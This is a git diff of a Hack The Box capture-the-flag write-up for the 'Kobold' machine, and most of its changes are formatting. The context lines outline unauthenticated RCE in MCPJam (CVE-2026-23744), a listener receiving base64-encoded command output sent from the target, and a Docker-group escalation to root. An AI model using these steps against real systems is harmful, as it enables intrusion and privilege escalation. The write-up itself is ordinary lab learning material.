@@ -1,7 +1,7 @@
 ---
 title: "HTB-Kobold"
 date: 2026-08-02
-description: Kobold is a Linux machine centred around a recently disclosed vulnerability (CVE-2026-23744) in **MCPJam**, an open-source Model Context Protocol server. Initial access is gained through unauthenticated remote code execution via the MCP connect endpoint. Privilege escalation abuses Docker group membership to mount the host filesystem and read the root flag.
+description: Kobold is a Linux machine centred around a recently disclosed vulnerability (CVE-2026-23744) in MCPJam, an open-source Model Context Protocol server. Initial access is gained through unauthenticated remote code execution via the MCP connect endpoint. Privilege escalation abuses Docker group membership to mount the host filesystem and read the root flag.
 
 tags: ['CVE-2026-23744', 'MCP', 'RCE', 'Docker Escape', 'PrivateBin'] 
 weight: 2
@@ -36,7 +36,7 @@ cascade:
 
 ### Port Scan
 
-```
+```text
 22/tcp   — OpenSSH 9.6p1
 80/tcp   — nginx (redirects to HTTPS)
 443/tcp  — nginx + TLS (kobold.htb)
@@ -46,6 +46,7 @@ cascade:
 ### Subdomain Enumeration
 
 Virtual host enumeration reveals two subdomains:
+
 
 | Subdomain | Service |
 |-----------|---------|
@@ -99,7 +100,7 @@ curl -k https://mcp.kobold.htb/api/mcp/connect \
 
 Listener receives:
 
-```
+```bash
 GET /dWlkPTEwMDEoYmVuKSBnaWQ9MTAwMShiZW4pIGdyb3Vwcz0xMDAxKGJlbiksMzcob3BlcmF0b3IpCg==
 ```
 
@@ -123,7 +124,7 @@ Shell received as `ben`. **User flag retrieved from `/home/ben/user.txt`.**
 
 ### Groups
 
-```
+```bash
 uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
 ```
 
@@ -131,7 +132,7 @@ The `operator` group is non-standard and worth investigating.
 
 ### Internal Services
 
-```
+```js
 127.0.0.1:8080   — PrivateBin (Docker container)
 127.0.0.1:6274   — Node.js (MCPJam backend)
 :::3552          — Golang HTTP app (public)
@@ -145,7 +146,7 @@ A Docker bridge (`docker0: 172.17.0.1`) is active with a veth pair, confirming a
 
 `/privatebin-data` is accessible to the `operator` group:
 
-```
+```bash
 drwxrwx--- operator  /privatebin-data/certs/   ← TLS cert + private key for *.kobold.htb
 drwxr-x--- gid=82    /privatebin-data/cfg/     ← Config (www-data only)
 drwxrwxrwx operator  /privatebin-data/data/    ← Paste storage (empty)
@@ -162,7 +163,7 @@ newgrp docker
 docker ps
 ```
 
-```
+```bash
 CONTAINER ID   IMAGE                               PORTS
 4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   127.0.0.1:8080->8080/tcp
 ```
@@ -185,7 +186,7 @@ docker run -it --rm \
 
 Inside the container:
 
-```
+```bash
 /var/www # id
 uid=0(root) gid=0(root) groups=0(root),...
 ```
@@ -208,7 +209,7 @@ The default entrypoint (`/etc/init.d/rc.local`) starts PHP-FPM and nginx, then d
 
 ## Attack Chain Summary
 
-```
+```text
 Subdomain enum → mcp.kobold.htb (MCPJam)
         ↓
 CVE-2026-23744 — Unauthenticated RCE via /api/mcp/connect
